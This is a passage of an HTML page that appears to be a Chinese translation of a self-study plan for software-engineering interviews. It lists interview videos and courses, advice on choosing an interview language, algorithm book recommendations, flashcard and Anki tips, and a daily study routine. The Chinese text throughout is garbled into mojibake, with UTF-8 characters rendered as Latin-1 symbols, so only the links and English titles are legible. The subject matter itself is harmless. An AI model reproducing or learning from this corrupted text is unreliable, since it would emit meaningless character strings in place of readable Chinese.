æ³•è§‚çœ‹è¿™äº›è¯¾ç¨‹çš„å½±ç‰‡ã€‚</p><pre><code>å¾ˆæ„Ÿè°¢ä½ èƒ½å¸®æˆ‘æŠŠç½‘ç»œå…¬å¼€è¯¾ç¨‹çš„è§†é¢‘é“¾æ¥è½¬æ¢æˆå…¬å¼€çš„ï¼Œå¯æŒç»­è®¿é—®çš„è§†é¢‘æºï¼Œæ¯”å¦‚ YouTube è§†é¢‘ï¼Œä»¥ä»£æ›¿é‚£äº›åœ¨çº¿è¯¾ç¨‹çš„è§†é¢‘ã€‚æ­¤å¤–ï¼Œä¸€äº›å¤§å­¦çš„è®²åº§è§†é¢‘ä¹Ÿæ˜¯æˆ‘æ‰€é’ççš„ã€‚</code></pre><h2><span id="mian-shi-guo-cheng-amp-tong-yong-de-mian-shi-zhun-bei">é¢è¯•è¿‡ç¨‹ &amp; é€šç”¨çš„é¢è¯•å‡†å¤‡</span></h2><ul><li>[ ] <a href="https://medium.com/always-be-coding/abc-always-be-coding-d5f8051afce2#.4heg8zvm4">ABCï¼šä¸è¦åœæ­¢ç¼–ç¨‹ï¼ˆAlways Be Codingï¼‰</a></li><li>[ ] <a href="https://medium.com/@dpup/whiteboarding-4df873dbba2e#.hf6jn45g1">ç™½æ¿ç¼–ç¨‹ï¼ˆWhiteboardingï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=N233T0epWTs">æ­ç§˜æŠ€æœ¯æ‹›è˜</a></li><li>[ ] å¦‚ä½•åœ¨ç§‘æŠ€å››å¼ºä¼ä¸šä¸­è·å¾—ä¸€ä»½å·¥ä½œï¼š<ul><li>[ ] <a href="https://www.youtube.com/watch?v=YJZCUhxNCv8">â€œå¦‚ä½•åœ¨ç§‘æŠ€å››å¼ºä¼ä¸šä¸­è·å¾—ä¸€ä»½å·¥ä½œ â€”â€” Amazonã€Facebookã€Google å’Œ Microsoftâ€ï¼ˆè§†é¢‘ï¼‰</a></li></ul></li><li>[ ] è§£å¯†å¼€å‘ç±»é¢è¯•ç¬¬ä¸€é›†ï¼š<ul><li>[ ] <a href="https://www.youtube.com/watch?v=rEJzOhC5ZtQ">Gayle L McDowell â€”â€” è§£å¯†å¼€å‘ç±»é¢è¯•ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=aClxtDcdpsQ">è§£å¯†å¼€å‘ç±»é¢è¯• â€”â€” ä½œè€… Gayle Laakmann McDowellï¼ˆè§†é¢‘ï¼‰</a></li></ul></li><li>[ ] è§£å¯† Facebook ç¼–ç é¢è¯•ï¼š<ul><li><a href="https://www.youtube.com/watch?v=wCl9kvQGHPI">æ–¹æ³•</a></li><li><a href="https://www.youtube.com/watch?v=4UWDyJq8jZg">é—®é¢˜æ¼”ç»ƒ</a></li></ul></li><li>[ ] å‡†å¤‡è¯¾ç¨‹ï¼š<ul><li>[ ] <a href="https://www.udemy.com/software-engineer-interview-unleashed">è½¯ä»¶å·¥ç¨‹å¸ˆé¢è¯•å‘å¸ƒï¼ˆæ”¶è´¹è¯¾ç¨‹ï¼‰</a>ï¼š<ul><li>ä»å‰ Google é¢è¯•å®˜èº«ä¸Šå­¦ä¹ å¦‚ä½•å‡†å¤‡è‡ªå·±ï¼Œè®©è‡ªå·±èƒ½å¤Ÿåº”ä»˜è½¯ä»¶å·¥ç¨‹å¸ˆçš„é¢è¯•ã€‚</li></ul></li><li>[ ] <a href="https://www.udemy.com/python-for-data-structures-algorithms-and-interviews/">Python æ•°æ®ç»“æ„ï¼Œç®—æ³•å’Œé¢è¯•ï¼ˆæ”¶è´¹è¯¾ç¨‹ï¼‰</a>ï¼š<ul><li>Python é¢è¯•å‡†å¤‡è¯¾ç¨‹ï¼Œå†…å®¹æ¶‰åŠæ•°æ®ç»“æ„ï¼Œç®—æ³•ï¼Œæ¨¡æ‹Ÿé¢è¯•ç­‰ã€‚</li></ul></li><li>[ ] <a href="https://www.udacity.com/course/data-structures-and-algorithms-in-python--ud513">Python çš„æ•°æ®ç»“æ„å’Œç®—æ³•ç®€ä»‹ï¼ˆUdacity å…è´¹è¯¾ç¨‹ï¼‰</a>ï¼š<ul><li>å…è´¹çš„ Python æ•°æ®ç»“æ„å’Œç®—æ³•è¯¾ç¨‹ã€‚</li></ul></li><li>[ ] <a href="https://www.udacity.com/course/data-structures-and-algorithms-nanodegree--nd256">æ•°æ®ç»“æ„å’Œç®—æ³•çº³ç±³å­¦ä½ï¼ï¼ˆUdacity æ”¶è´¹çº³ç±³å­¦ä½ï¼‰</a>ï¼š<ul><li>è·å¾—è¶…è¿‡100ç§æ•°æ®ç»“æ„å’Œç®—æ³•ç»ƒä¹ ä»¥åŠæŒ‡å¯¼çš„åŠ¨æ‰‹ç»ƒä¹ ï¼Œä¸“é—¨å¯¼å¸ˆå¸®åŠ©ä½ åœ¨é¢è¯•å’ŒèŒåœºä¸­åšå¥½å‡†å¤‡ã€‚</li></ul></li><li>[ ] <a href="https://www.educative.io/courses/grokking-the-behavioral-interview">æ¢ç©¶è¡Œä¸ºé¢è¯•ï¼ˆEducative å…è´¹è¯¾ç¨‹ï¼‰</a>ï¼š<ul><li>å¾ˆå¤šæ—¶å€™ï¼Œä¸æ˜¯ä½ çš„æŠ€æœ¯èƒ½åŠ›ä¼šé˜»ç¢ä½ è·å¾—ç†æƒ³çš„å·¥ä½œï¼Œè€Œæ˜¯ä½ åœ¨è¡Œä¸ºé¢è¯•ä¸­çš„è¡¨ç°ã€‚</li></ul></li></ul></li></ul><h2><span id="wei-ni-de-mian-shi-xuan-ze-yi-chong-yu-yan">ä¸ºä½ çš„é¢è¯•é€‰æ‹©ä¸€ç§è¯­è¨€</span></h2><p>ä½ å¯ä»¥åœ¨ç¼–ç¨‹è¿™ä¸€ç¯èŠ‚ï¼Œä½¿ç”¨ä¸€ç§è‡ªå·±ç”¨èµ·æ¥è¾ƒä¸ºèˆ’é€‚çš„è¯­è¨€å»å®Œæˆç¼–ç¨‹ï¼Œä½†å¯¹äºå¤§å…¬å¸ï¼Œä½ åªæœ‰ä¸‰ç§å›ºå®šçš„é€‰æ‹©ï¼š</p><ul><li>C++</li><li>Java</li><li>Python</li></ul><p>ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ä¸‹é¢ä¸¤ç§ç¼–ç¨‹è¯­è¨€ï¼Œä½†å¯èƒ½ä¼šæœ‰æŸäº›é™åˆ¶ï¼Œä½ éœ€è¦å®ç°æŸ¥æ˜ï¼š</p><ul><li>JavaScript</li><li>Ruby</li></ul><p>æˆ‘ä¹‹å‰å†™è¿‡ä¸€ç¯‡å…³äºåœ¨é¢è¯•æ—¶é€‰æ‹©ç¼–ç¨‹è¯­è¨€çš„æ–‡ç« ï¼š<a href="https://startupnextdoor.com/important-pick-one-language-for-the-coding-interview/">ä¸ºç¼–ç¨‹é¢è¯•é€‰æ‹©ä¸€ç§è¯­è¨€</a>ã€‚</p><p>ä½ éœ€è¦å¯¹ä½ æ‰€é€‰æ‹©çš„è¯­è¨€æ„Ÿåˆ°éå¸¸èˆ’é€‚ä¸”è¶³å¤Ÿäº†è§£ã€‚</p><p>æ›´å¤šå…³äºè¯­è¨€é€‰æ‹©çš„é˜…è¯»ï¼š</p><ul><li><a href="http://www.byte-by-byte.com/choose-the-right-language-for-your-coding-interview/">http://www.byte-by-byte.com/choose-the-right-language-for-your-coding-interview/</a></li><li><a href="http://blog.codingforinterviews.com/best-programming-language-jobs/">http://blog.codingforinterviews.com/best-programming-language-jobs/</a></li></ul><p><a href="../programming-language-resources.md">åœ¨æ­¤æŸ¥çœ‹ç›¸å…³è¯­è¨€çš„èµ„æº</a></p><p>ç”±äºæˆ‘æ­£åœ¨å­¦ä¹ Cã€C++ å’Œ Pythonï¼Œå› æ­¤åœ¨ä¸‹é¢ä½ ä¼šçœ‹åˆ°éƒ¨åˆ†å…³äºå®ƒä»¬çš„å­¦ä¹ èµ„æ–™ã€‚ç›¸å…³ä¹¦ç±è¯·çœ‹æ–‡ç« çš„åº•éƒ¨ã€‚</p><h2><span id="shu-dan">ä¹¦å•</span></h2><p>ä¸ºäº†èŠ‚çœä½ çš„æ—¶é—´ï¼Œä»¥ä¸‹æ˜¯æ¯”æˆ‘ä½¿ç”¨è¿‡çš„æ›´ç¼©å‡çš„ä¹¦å•ã€‚</p><h3><span id="mian-shi-zhun-bei">é¢è¯•å‡†å¤‡</span></h3><ul><li>[ ] <a href="https://www.amazon.com/Programming-Interviews-Exposed-Through-Interview/dp/111941847X/">Programming Interviews Exposed: Coding Your Way Through the Interview, 4th Edition</a><ul><li>é™„æœ‰ C++ å’Œ Java è§£ç­”</li><li>è¿™æ˜¯åœ¨ç»ƒä¹  Cracking the Coding Interview ä¹‹å‰ä¸€ä¸ªå¾ˆå¥½çš„çƒ­èº«</li><li>ä¸å¤ªå›°éš¾ï¼Œå¤§å¤šæ•°é—®é¢˜å¯èƒ½æ¯”ä½ åœ¨é¢è¯•ä¸­çœ‹åˆ°çš„è¦å®¹æ˜“ï¼ˆæ ¹æ®æˆ‘çš„é˜…è¯»ï¼‰</li></ul></li><li>[ ] <a href="http://www.amazon.com/Cracking-Coding-Interview-6th-Programming/dp/0984782850/">Cracking the Coding Interview, 6th Edition</a><ul><li>é™„æœ‰ Java ç­”æ¡ˆ</li></ul></li></ul><h3><span id="ru-guo-ni-you-e-wai-de-shi-jian">å¦‚æœä½ æœ‰é¢å¤–çš„æ—¶é—´ï¼š</span></h3><p>é€‰æ‹©ä»¥ä¸‹ä¹‹ä¸€ï¼š</p><ul><li>[ ] <a href="https://www.amazon.com/Elements-Programming-Interviews-Insiders-Guide/dp/1479274836">Elements of Programming Interviews (C++ version)</a></li><li>[ ] <a href="https://www.amazon.com/Elements-Programming-Interviews-Python-Insiders/dp/1537713949/">Elements of Programming Interviews in Python</a></li><li>[ ] Elements of Programming Interviews (Java version)<ul><li><a href="https://www.amazon.com/Elements-Programming-Interviews-Java-Insiders/dp/1517435803/">ä¹¦</a></li><li><a href="https://github.com/gardncl/elements-of-programming-interviews">é…å¥—é¡¹ç›®â”€â”€ä¹¦ä¸­æ¯ä¸ªé—®é¢˜çš„æ–¹æ³•å’Œæµ‹è¯•ç”¨ä¾‹</a></li></ul></li></ul><h3><span id="bian-cheng-yu-yan-jing-xuan">ç¼–ç¨‹è¯­è¨€ç²¾é€‰</span></h3><p><strong>ä½ éœ€è¦é€‰æ‹©é¢è¯•è¯­è¨€ï¼ˆè¯·å‚è§ä¸Šæ–‡ï¼‰ã€‚</strong></p><p>è¿™æ˜¯æˆ‘æŒ‰è¯­è¨€ç»™å‡ºçš„å»ºè®®ã€‚æˆ‘æ²¡æœ‰æ‰€æœ‰è¯­è¨€çš„èµ„æºï¼Œæ¬¢è¿è´¡çŒ®ã€‚</p><p>å¦‚æœä½ é€šè¯»å…¶ä¸­ä¹‹ä¸€ï¼Œä½ åº”è¯¥å…·å¤‡äº†å¼€å§‹è§£å†³ç¼–ç¨‹é—®é¢˜æ‰€éœ€çš„æ‰€æœ‰æ•°æ®ç»“æ„å’Œç®—æ³•çŸ¥è¯†ã€‚é™¤éä½ éœ€è¦å¤ä¹ ï¼Œå¦åˆ™<strong>ä½ å¯ä»¥è·³è¿‡æ­¤é¡¹ç›®ä¸­çš„æ‰€æœ‰è§†é¢‘è®²åº§</strong>ã€‚</p><p><a href="https://github.com/jwasham/coding-interview-university/blob/master/programming-language-resources.md">é¢å¤–ç¼–ç¨‹è¯­è¨€çš„ç²¾é€‰èµ„æº</a></p><h3><span id="c">C++</span></h3><p>æˆ‘æ²¡æœ‰è¯»è¿‡è¿™ä¸¤æœ¬ä¹¦ï¼Œä½†æ˜¯å®ƒä»¬é¢‡å—å¥½è¯„ï¼Œä½œè€…æ˜¯ Sedgewickï¼Œä»–éå¸¸å‰å®³ã€‚</p><ul><li>[ ] <a href="https://www.amazon.com/Algorithms-Parts-1-4-Fundamentals-Structure/dp/0201350882/">Algorithms in C++, Parts 1-4: Fundamentals, Data Structure, Sorting, Searching</a></li><li>[ ] <a href="https://www.amazon.com/Algorithms-Part-Graph-3rd-Pt-5/dp/0201361183/">Algorithms in C++ Part 5: Graph Algorithms</a></li><li>[ ] <a href="https://opendatastructures.org/ods-cpp.pdf">Open Data Structures in C++</a><ul><li>ä¸°å¯Œè€Œè¯¦ç»†çš„æ•°æ®ç»“æ„å’Œç®—æ³•é›†åˆ</li><li>éå¸¸é€‚åˆåˆå­¦è€…</li></ul></li></ul><p>å¦‚æœä½ æœ‰æ›´å¥½çš„ C++ ä¹¦ç±ï¼Œè¯·å‘Šè¯‰æˆ‘ã€‚æˆ‘æ­£åœ¨æœé›†å…¨é¢çš„èµ„æºã€‚</p><h3><span id="java">Java</span></h3><ul><li>[ ] <a href="https://www.amazon.com/Algorithms-4th-Robert-Sedgewick/dp/032157351X/">ç®—æ³•ï¼ˆSedgewick å’Œ Wayneï¼‰</a><ul><li>åŒ…å«è¯¾ç¨‹å†…å®¹ï¼ˆå’ŒSedgewickï¼ï¼‰çš„è§†é¢‘<ul><li><a href="https://www.coursera.org/learn/algorithms-part1">ç¬¬ä¸€éƒ¨åˆ†</a></li><li><a href="https://www.coursera.org/learn/algorithms-part2">ç¬¬äºŒéƒ¨åˆ†</a></li></ul></li></ul></li></ul><p>æˆ–è€…ï¼š</p><ul><li>[ ] <a href="https://www.amazon.com/Data-Structures-Algorithms-Michael-Goodrich/dp/1118771338/">Java æ•°æ®ç»“æ„å’Œç®—æ³•</a><ul><li>ä½œè€…ï¼šGoodrichã€Tamassiaã€Goldwasser</li><li>ç”¨ä½œ UC Berkeley çš„ CS å…¥é—¨è¯¾ç¨‹çš„å¯é€‰æ•™æ</li><li>è¯·å‚é˜…ä¸‹é¢æœ‰å…³ Python ç‰ˆæœ¬çš„æˆ‘çš„è¯»ä¹¦æŠ¥å‘Šï¼Œè¿™æœ¬ä¹¦æ¶µç›–äº†ç›¸åŒçš„ä¸»é¢˜</li></ul></li></ul><h3><span id="python">Python</span></h3><ul><li>[ ] <a href="https://www.amazon.com/Structures-Algorithms-Python-Michael-Goodrich/dp/1118290275/">Pythonæ•°æ®ç»“æ„å’Œç®—æ³•</a><ul><li>ä½œè€…ï¼šGoodrichã€Tamassiaã€Goldwasser</li><li>æˆ‘éå¸¸å–œçˆ±è¿™æœ¬ä¹¦ï¼Œå®ƒåŒ…å«äº†æ‰€æœ‰ä¸œè¥¿</li><li>å¾ˆ Python çš„ä»£ç </li><li>æˆ‘çš„è¯»ä¹¦æŠ¥å‘Šï¼š<a href="https://startupnextdoor.com/book-report-data-structures-and-algorithms-in-python/">startupnextdoor.com/book-report-data-structures-and-algorithms-in-python</a></li></ul></li><li>[ ] <a href="https://opendatastructures.org/ods-python.pdf">Open Data Structures in Python</a></li></ul><h2><span id="zai-ni-kai-shi-zhi-qian">åœ¨ä½ å¼€å§‹ä¹‹å‰</span></h2><p>è¯¥åˆ—è¡¨å·²ç»æŒç»­æ›´æ–°äº†å¾ˆé•¿çš„ä¸€æ®µæ—¶é—´ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬çš„ç¡®å¾ˆå®¹æ˜“ä¼šå¯¹å…¶å¤±å»æ§åˆ¶ã€‚</p><p>è¿™é‡Œåˆ—å‡ºäº†ä¸€äº›æˆ‘æ‰€çŠ¯è¿‡çš„é”™è¯¯ï¼Œå¸Œæœ›ä½ ä¸è¦é‡æ»”è¦†è¾™ã€‚</p><h3><span id="1-ni-bu-ke-neng-ba-suo-you-de-dong-xi-du-ji-zhu">1. ä½ ä¸å¯èƒ½æŠŠæ‰€æœ‰çš„ä¸œè¥¿éƒ½è®°ä½</span></h3><p>å°±ç®—æˆ‘è§‚çœ‹äº†æ•°å°æ—¶çš„è§†é¢‘ï¼Œå¹¶è®°å½•äº†å¤§é‡çš„ç¬”è®°ï¼Œå‡ ä¸ªæœˆåçš„æˆ‘ï¼Œä»ç„¶ä¼šå¿˜å´å…¶ä¸­å¤§éƒ¨åˆ†çš„ä¸œè¥¿ã€‚æ‰€ä»¥ï¼Œæˆ‘èŠ±äº†3å¤©ç¿»é˜…æˆ‘çš„ç¬”è®°ï¼Œå¹¶åˆ¶ä½œæˆæŠ½è®¤å¡ï¼ˆflashcardï¼‰å¸®åŠ©æˆ‘å¤ä¹ ï¼š</p><p>è¯·é˜…è¯»ä»¥ä¸‹çš„æ–‡ç« ä»¥å…é‡è¹ˆè¦†è¾™:</p><p><a href="https://startupnextdoor.com/retaining-computer-science-knowledge/">è®°ä½è®¡ç®—æœºç§‘å­¦çŸ¥è¯†</a>ã€‚</p><p>æœ‰äººæ¨èç»™æˆ‘çš„è¯¾ç¨‹ï¼ˆä½†æˆ‘è¿˜æ²’çœ‹è¿‡ï¼‰ï¼š<a href="https://www.coursera.org/learn/learning-how-to-learn">å­¦ä¹ å¦‚ä½•å­¦ä¹ </a>ã€‚</p><h3><span id="2-shi-yong-chou-ren-qia">2. ä½¿ç”¨æŠ½è®¤å¡</span></h3><p>ä¸ºäº†è§£å†³å–„å¿˜çš„é—®é¢˜ï¼Œæˆ‘åˆ¶ä½œäº†ä¸€ä¸ªæŠ½è®¤å¡çš„ç½‘é¡µï¼Œç”¨äºæ·»åŠ ä¸¤ç§æŠ½è®¤å¡ï¼šä¸€èˆ¬çš„åŠå¸¦æœ‰ä»£ç çš„ã€‚æ¯ç§å¡éƒ½ä¼šæœ‰ä¸åŒçš„æ ¼å¼è®¾è®¡ã€‚</p><p>è€Œä¸”ï¼Œæˆ‘è¿˜ä»¥ç§»åŠ¨è®¾å¤‡ä¸ºå…ˆå»è®¾è®¡è¿™äº›ç½‘é¡µï¼Œä»¥ä½¿å¾—åœ¨ä»»ä½•åœ°æ–¹ï¼Œæˆ‘éƒ½èƒ½é€šè¿‡æˆ‘çš„æ‰‹æœºåŠå¹³æ¿å»å›é¡¾çŸ¥è¯†ã€‚</p><p>ä½ ä¹Ÿå¯ä»¥å…è´¹åˆ¶ä½œå±äºä½ è‡ªå·±çš„æŠ½è®¤å¡ç½‘ç«™ï¼š</p><ul><li><a href="https://github.com/jwasham/computer-science-flash-cards">æŠ½è®¤å¡é¡µé¢çš„ä»£ç ä»“åº“</a></li><li><a href="https://github.com/jwasham/computer-science-flash-cards/blob/master/cards-jwasham.db">æˆ‘çš„æŠ½è®¤å¡æ•°æ®åº“ â”€â”€ æ—§ 1200 å¼ </a></li><li><a href="https://github.com/jwasham/computer-science-flash-cards/blob/master/cards-jwasham-extreme.db">æˆ‘çš„æŠ½è®¤å¡æ•°æ®åº“ â”€â”€ æ–° 1800 å¼ </a></li></ul><p>æœ‰ä¸€ç‚¹éœ€è¦è®°ä½çš„æ˜¯ï¼Œæˆ‘åšäº‹æœ‰ç‚¹è¿‡å¤´ï¼Œä»¥è‡³äºå¡ç‰‡éƒ½è¦†ç›–åˆ°æ‰€æœ‰çš„ä¸œè¥¿ä¸Šï¼Œä»æ±‡ç¼–è¯­è¨€å’Œ Python çš„ç»†ææœ«èŠ‚ï¼Œåˆ°æœºå™¨å­¦ä¹ å’Œç»Ÿè®¡éƒ½è¢«è¦†ç›–åˆ°å¡ç‰‡ä¸Šã€‚è€Œè¿™ç§åšæ³•ï¼Œå¯¹äºè¦æ±‚æ¥è¯´æ˜¯å¤šä½™çš„ã€‚</p><p><strong>åœ¨æŠ½è®¤å¡ä¸Šåšç¬”è®°ï¼š</strong> è‹¥ä½ ç¬¬ä¸€æ¬¡å‘ç°ä½ çŸ¥é“é—®é¢˜çš„ç­”æ¡ˆæ—¶ï¼Œå…ˆä¸è¦æ€¥ç€æŠŠå…¶æ ‡æ³¨æˆâ€œå·²çŸ¥â€ã€‚åå¤å¤ä¹ è¿™å¼ æŠ½è®¤å¡ï¼Œç›´åˆ°æ¯æ¬¡éƒ½èƒ½ç­”å¯¹åæ‰æ˜¯çœŸæ­£å­¦ä¼šäº†è¿™ä¸ªé—®é¢˜ã€‚åå¤åœ°é—®ç­”å¯å¸®åŠ©ä½ æ·±åˆ»è®°ä½è¯¥çŸ¥è¯†ç‚¹ã€‚</p><p>è¿™é‡Œæœ‰ä¸ªæ›¿ä»£æˆ‘æŠ½è®¤å¡çš„ç½‘ç«™ <a href="http://ankisrs.net/">Anki</a>ï¼Œå¾ˆå¤šäººå‘æˆ‘æ¨èè¿‡å®ƒã€‚è¿™ä¸ªç½‘ç«™ç”¨åŒä¸€ä¸ªå­—å¡é‡å¤å‡ºç°çš„æ–¹å¼è®©ä½ ç‰¢ç‰¢åœ°è®°ä½çŸ¥è¯†ã€‚è¿™ä¸ªç½‘ç«™éå¸¸å®¹æ˜“ä½¿ç”¨ï¼Œæ”¯æŒå¤šå¹³å°ï¼Œå¹¶ä¸”æœ‰äº‘ç«¯åŒæ­¥åŠŸèƒ½ã€‚åœ¨ iOS å¹³å°ä¸Šæ”¶è´¹25ç¾é‡‘ï¼Œå…¶ä»–å¹³å°å…è´¹ã€‚</p><p>è¿™æ˜¯æˆ‘ç”¨ Anki è¿™ä¸ªç½‘ç«™é‡Œçš„æ ¼å¼æ‰€å‚¨å­˜çš„æŠ½è®¤å¡èµ„æ–™åº“: <a href="http://ankiweb.net/shared/info/25173560">ankiweb.net/shared/info/25173560</a> ï¼ˆæ„Ÿè°¢ <a href="https://github.com/xiewenya">@xiewenya</a>ï¼‰</p><h3><span id="3-fu-xi-fu-xi-zai-fu-xi">3. å¤ä¹ ï¼Œå¤ä¹ ï¼Œå†å¤ä¹ </span></h3><p>æˆ‘ç•™æœ‰ä¸€ç»„ ASCII ç è¡¨ã€OSI å †æ ˆã€Big-O è®°å·åŠæ›´å¤šçš„æŠ½è®¤å¡ï¼Œä»¥ä¾¿åœ¨ç©ºä½™çš„æ—¶å€™å¯ä»¥å­¦ä¹ ã€‚</p><p>ç¼–ç¨‹ç´¯äº†å°±ä¼‘æ¯åŠä¸ªå°æ—¶ï¼Œå¹¶å»å¤ä¹ ä½ çš„æŠ½è®¤å¡ã€‚</p><h3><span id="4-zhuan-zhu">4. ä¸“æ³¨</span></h3><p>åœ¨å­¦ä¹ çš„è¿‡ç¨‹ä¸­ï¼Œå¾€å¾€ä¼šæœ‰è®¸å¤šä»¤äººåˆ†å¿ƒçš„äº‹å æ®ç€æˆ‘ä»¬å®è´µçš„æ—¶é—´ã€‚å› æ­¤ï¼Œä¸“æ³¨å’Œé›†ä¸­æ³¨æ„åŠ›æ˜¯éå¸¸å›°éš¾çš„ã€‚æ”¾ç‚¹çº¯éŸ³ä¹èƒ½å¸®ä¸Šä¸€äº›å¿™ã€‚</p><h2><span id="mei-you-bao-han-de-nei-rong">æ²¡æœ‰åŒ…å«çš„å†…å®¹</span></h2><p>æœ‰ä¸€äº›ç†Ÿæ‚‰ä¸”æ™®éçš„æŠ€æœ¯åœ¨æ­¤æœªè¢«è°ˆåŠåˆ°ï¼š</p><ul><li>SQL</li><li>Javascript</li><li>HTMLã€CSS å’Œå…¶ä»–å‰ç«¯æŠ€æœ¯</li></ul><h2><span id="ri-chang-ji-hua">æ—¥å¸¸è®¡åˆ’</span></h2><p>éƒ¨åˆ†é—®é¢˜å¯èƒ½ä¼šèŠ±è´¹ä¸€å¤©çš„æ—¶é—´å»å­¦ä¹ ï¼Œè€Œæœ‰äº›åˆ™ä¼šèŠ±è´¹å¤šå¤©ã€‚å½“ç„¶ï¼Œæœ‰äº›å­¦ä¹ å¹¶ä¸éœ€è¦æˆ‘ä»¬æ‡‚å¾—å¦‚ä½•å®ç°ã€‚</p><p>å› æ­¤ï¼Œæ¯ä¸€å¤©æˆ‘éƒ½ä¼šåœ¨ä¸‹é¢æ‰€åˆ—å‡ºçš„åˆ—è¡¨ä¸­é€‰æ‹©ä¸€é¡¹ï¼Œå¹¶è§‚çœ‹ç›¸å…³çš„è§†é¢‘ã€‚ç„¶åï¼Œä½¿ç”¨ä»¥ä¸‹çš„ä¸€ç§è¯­è¨€å»å®ç°ï¼š</p><ul><li>C â€”â€” ä½¿ç”¨ç»“æ„ä½“å’Œå‡½æ•°ï¼Œè¯¥å‡½æ•°ä¼šæ¥å—ä¸€ä¸ªç»“æ„ä½“æŒ‡é’ˆ * åŠå…¶ä»–æ•°æ®ä½œä¸ºå‚æ•°ã€‚</li><li>C++ â€”â€” ä¸ä½¿ç”¨å†…å»ºçš„æ•°æ®ç±»å‹ã€‚</li><li>C++ â€”â€” ä½¿ç”¨å†…å»ºçš„æ•°æ®ç±»å‹ï¼Œå¦‚ä½¿ç”¨ STL çš„ std::list æ¥ä½œä¸ºé“¾è¡¨ã€‚</li><li>Python â€”â€”  ä½¿ç”¨å†…å»ºçš„æ•°æ®ç±»å‹ï¼ˆä¸ºäº†æŒç»­ç»ƒä¹  Pythonï¼‰ï¼Œå¹¶ç¼–å†™ä¸€äº›æµ‹è¯•å»ä¿è¯è‡ªå·±ä»£ç çš„æ­£ç¡®æ€§ã€‚æœ‰æ—¶ï¼Œåªéœ€è¦ä½¿ç”¨æ–­è¨€å‡½æ•° assert() å³å¯ã€‚</li><li>æ­¤å¤–ï¼Œä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ Java æˆ–å…¶ä»–è¯­è¨€ã€‚ä»¥ä¸Šåªæ˜¯æˆ‘çš„ä¸ªäººåå¥½è€Œå·²ã€‚</li></ul><p>ä½ ä¸éœ€è¦å­¦ä¼šæ‰€æœ‰çš„ç¼–ç¨‹è¯­è¨€ï¼Œä½ åªéœ€è¦ä¸“æ³¨åœ¨<a href="##%E4%B8%BA%E4%BD%A0%E7%9A%84%E9%9D%A2%E8%AF%95%E9%80%89%E6%8B%A9%E4%B8%80%E7%A7%8D%E8%AF%AD%E8%A8%80">ä¸€ç§ç¼–ç¨‹è¯­è¨€</a>ä¸Šã€‚</p><p>ä¸ºä½•è¦åœ¨è¿™äº›è¯­è¨€ä¸Šåˆ†åˆ«å®ç°ä¸€æ¬¡ï¼Ÿ</p><ul><li>ç»ƒä¹ ï¼Œç»ƒä¹ ï¼Œç»ƒä¹ ï¼Œç›´è‡³æˆ‘åŒå€¦å®ƒï¼Œå¹¶æ­£ç¡®æ— è¯¯åœ°å®ç°å‡ºæ¥ã€‚ï¼ˆè‹¥æœ‰éƒ¨åˆ†è¾¹ç¼˜æ¡ä»¶æ²¡æƒ³åˆ°æ—¶ï¼Œæˆ‘ä¼šç”¨ä¹¦å†™çš„å½¢å¼è®°å½•ä¸‹æ¥å¹¶å»è®°å¿†ï¼‰</li><li>åœ¨çº¯åŸç”Ÿçš„æ¡ä»¶ä¸‹å·¥ä½œï¼ˆä¸éœ€åƒåœ¾å›æ”¶æœºåˆ¶çš„å¸®åŠ©ä¸‹ï¼Œæ‰‹åŠ¨åˆ†é…/é‡Šæ”¾å†…å­˜ï¼ˆé™¤äº† Pythonï¼‰ï¼‰</li><li>åˆ©ç”¨è¯­è¨€å†…å»ºçš„æ•°æ®ç±»å‹ï¼Œä¹‹ååœ¨å®é™…å·¥ä½œçš„æ—¶å€™æ‰èƒ½å¾—å¿ƒåº”æ‰‹ï¼ˆåœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œæˆ‘ä¸ä¼šå»å®ç°è‡ªå·±çš„é“¾è¡¨ï¼‰</li></ul><p>å°±ç®—æˆ‘æ²¡æœ‰æ—¶é—´å»æ¯ä¸€é¡¹éƒ½è¿™ä¹ˆåšï¼Œä½†æˆ‘ä¹Ÿä¼šå°½æˆ‘æ‰€èƒ½ã€‚</p><p>åœ¨è¿™é‡Œä½ å¯ä»¥æŸ¥çœ‹åˆ°æˆ‘çš„ä»£ç ï¼š</p><ul><li><a href="https://github.com/jwasham/practice-c">C</a></li><li><a href="https://github.com/jwasham/practice-cpp">C++</a></li><li><a href="https://github.com/jwasham/practice-python">Python</a></li></ul><p>ä½ ä¸éœ€è¦è®°ä½æ¯ä¸€ä¸ªç®—æ³•çš„å†…éƒ¨åŸç†ã€‚</p><p>åœ¨ä¸€ä¸ªç™½æ¿ä¸Šå†™ä»£ç ï¼Œè€Œä¸è¦ç›´æ¥åœ¨è®¡ç®—æœºä¸Šç¼–å†™ã€‚åœ¨æµ‹è¯•å®Œéƒ¨åˆ†ç®€å•çš„è¾“å…¥åï¼Œåˆ°è®¡ç®—æœºä¸Šå†æµ‹è¯•ä¸€éã€‚</p><h2><span id="bi-bei-zhi-shi">å¿…å¤‡çŸ¥è¯†</span></h2><ul><li><p>[ ] <strong>å­¦ä¹ Cè¯­è¨€</strong></p><ul><li>C è¯­è¨€æ— å¤„ä¸åœ¨ã€‚åœ¨å­¦ä¹ çš„è¿‡ç¨‹ä¸­ï¼Œä½ ä¼šåœ¨ä¹¦ç±ï¼Œè®²åº§ï¼Œè§†é¢‘ç­‰ä»»ä½•åœ°æ–¹çœ‹åˆ°å®ƒçš„èº«å½±</li><li>[ ] <a href="https://www.amazon.com/Programming-Language-Brian-W-Kernighan/dp/0131103628">Cç¨‹åºè®¾è®¡è¯­è¨€ï¼Œç¬¬äºŒç‰ˆ</a><ul><li>è¿™æ˜¯ä¸€æœ¬ç®€çŸ­çš„ä¹¦ï¼Œä½†æ˜¯å®ƒå°†ä½¿ä½ æ›´å¥½åœ°ä½¿ç”¨ C è¯­è¨€ï¼Œå¹¶ä¸”å¦‚æœä½ ç¨åŠ ç»ƒä¹ ï¼Œå°±ä¼šå¾ˆå¿«ç†Ÿç»ƒã€‚ç†è§£ C å¯å¸®åŠ©ä½ äº†è§£ç¨‹åºå’Œå†…å­˜çš„å·¥ä½œæ–¹å¼</li><li>é—®é¢˜ç­”æ¡ˆ</li></ul></li></ul></li><li><p>[ ] <strong>è®¡ç®—æœºæ˜¯å¦‚ä½•å¤„ç†ä¸€æ®µç¨‹åºï¼š</strong></p><ul><li>[ ] <a 